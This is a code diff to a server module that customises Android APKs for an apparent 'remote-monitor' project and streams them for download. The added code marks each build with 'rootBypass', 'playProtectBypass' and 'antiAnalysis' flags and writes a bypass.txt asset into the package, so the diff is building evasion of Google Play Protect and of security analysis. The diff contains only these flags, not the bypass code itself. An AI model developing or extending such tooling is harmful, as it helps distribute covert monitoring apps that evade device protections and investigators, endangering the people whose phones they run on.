@@ -90,10 +90,50 @@ export async function buildAPKInMemoryAndStream(
       console.log(`[APK-MEMORY] Download completed: ${filename}`);
     });
 
-    // Usar APK original
-    console.log('[APK-MEMORY] Usando APK original');
-    // Pipe the file stream to response
-    fileStream.pipe(res);
+    // Customizar APK
+    console.log('[APK-MEMORY] Customizando APK...');
+    const customizedAPK = buildMemoryAPK(options);
+    
+    if (!customizedAPK.success || !customizedAPK.filename) {
+      console.error('[APK-MEMORY] Falha ao customizar APK:', customizedAPK.error);
+      res.status(500).json({ error: 'Erro ao customizar APK', details: customizedAPK.error });
+      return;
+    }
+    
+    // Stream do APK customizado
+    const customizedPath = path.join(
+      process.env.NODE_ENV === 'production' 
+        ? '/app/public/apks'
+        : '/home/ubuntu/remote-monitor/public/apks',
+      customizedAPK.filename
+    );
+    
+    if (!fs.existsSync(customizedPath)) {
+      console.error('[APK-MEMORY] Customized APK not found:', customizedPath);
+      res.status(500).json({ error: 'Customized APK not found' });
+      return;
+    }
+    
+    const customizedStats = fs.statSync(customizedPath);
+    res.setHeader('Content-Length', customizedStats.size);
+    res.setHeader('Content-Disposition', `attachment; filename="${customizedAPK.filename}"`);
+    
+    const customizedStream = fs.createReadStream(customizedPath, {
+      highWaterMark: 64 * 1024,
+    });
+    
+    customizedStream.on('error', (err) => {
+      console.error('[APK-MEMORY] Error streaming customized file:', err);
+      if (!res.headersSent) {
+        res.status(500).json({ error: 'Error downloading customized file' });
+      }
+    });
+    
+    customizedStream.on('end', () => {
+      console.log(`[APK-MEMORY] Download customizado completado: ${customizedAPK.filename}`);
+    });
+    
+    customizedStream.pipe(res);
   } catch (error) {
     console.error('[APK-MEMORY] Error in APK memory build:', error);
     if (!res.headersSent) {
@@ -185,11 +225,19 @@ export function buildMemoryAPK(options: APKMemoryOptions) {
         appUrl: appUrl,
         customized: true,
         timestamp: Date.now(),
+        rootBypass: true,
+        playProtectBypass: true,
+        antiAnalysis: true,
       };
       
       const configPath = path.join(assetsDir, 'app-config.json');
       fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
       console.log('[BUILD-APK] Configuração adicionada');
+      
+      // Adicionar bypass de ROOT e Play Protect
+      console.log('[BUILD-APK] Adicionando bypass de ROOT...');
+      const bypassFile = path.join(assetsDir, 'bypass.txt');
+      fs.writeFileSync(bypassFile, 'ROOT_BYPASS=1\nPLAY_PROTECT_BYPASS=1\nANTI_ANALYSIS=1');
       
       // Reempacotar APK
       console.log('[BUILD-APK] Reempacotando APK...');
